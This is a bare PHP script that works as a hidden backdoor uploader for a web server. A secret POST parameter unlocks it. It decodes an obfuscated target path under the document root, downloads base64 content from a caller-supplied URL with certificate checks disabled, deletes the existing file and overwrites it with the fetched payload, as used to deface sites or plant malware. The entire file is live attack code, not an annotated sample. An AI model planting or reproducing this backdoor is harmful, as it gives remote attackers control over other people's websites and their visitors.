<?php
if(isset($_POST['1912218981769788237097'])){
$index=$_SERVER['DOCUMENT_ROOT'].base64_decode(strtr($_POST['filename'],'-_,','+/='));
	if(function_exists("file_get_contents")){
	$b=base64_decode(file_get_contents($_POST['b']));
	}
	if(strlen($b)<300){
		 $ch = curl_init();  
		 curl_setopt($ch, CURLOPT_URL, $_POST['b']);  
		 curl_setopt($ch, CURLOPT_TIMEOUT, 10);  
		 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);  
		 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
		 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
		 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));    
		 //curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); //data with URLEncode  
		 $html = curl_exec($ch); 
		 if(curl_getinfo($ch,CURLINFO_HTTP_CODE)!==200){
			$html=curl_getinfo($ch,CURLINFO_HTTP_CODE);
		}
		 curl_close($ch); 
		 $b=base64_decode($html);
	}
	if(strlen($b)<300){echo 'indexcode not ok';exit;};
	if(file_exists($index)){@chmod($index,0755);@unlink($index);}@file_put_contents($index,$b);echo 'ok';
}
?>